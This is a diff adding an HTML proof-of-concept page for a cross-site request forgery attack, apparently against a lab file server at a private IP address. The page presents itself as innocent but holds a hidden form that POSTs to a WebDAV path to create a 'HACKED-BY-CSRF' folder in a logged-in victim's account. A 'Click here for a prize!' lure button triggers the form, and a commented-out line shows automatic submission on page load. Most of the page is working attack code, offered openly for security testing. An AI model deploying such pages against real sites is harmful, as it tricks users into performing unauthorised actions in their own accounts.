@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Innocent Looking Page</title>
+</head>
+<body>
+    <h1>Welcome to My Totally Innocent Website!</h1>
+    <p>Nothing suspicious here...</p>
+
+    <!-- Hidden CSRF attack form -->
+    <form id="csrfAttack" action="http://10.0.0.47:8080/remote.php/dav/files/testbruteforce/HACKED-BY-CSRF/" method="POST" style="display:none;">
+        <!-- This form attempts to create a folder named "HACKED-BY-CSRF" in the victim's account -->
+        <!-- If CSRF protection is missing, this will succeed when victim visits this page while logged in -->
+    </form>
+
+    <script>
+        // Automatically submit the form when page loads
+        // document.getElementById('csrfAttack').submit();
+
+        // Uncomment above line to auto-submit (currently disabled for safety)
+        console.log("CSRF attack form created but not auto-submitted");
+        console.log("In a real attack, this would submit automatically");
+    </script>
+
+    <p><button onclick="document.getElementById('csrfAttack').submit()">Click here for a prize!</button></p>
+    <p>(This button demonstrates how attackers trick users into triggering CSRF attacks)</p>
+</body>
+</html>
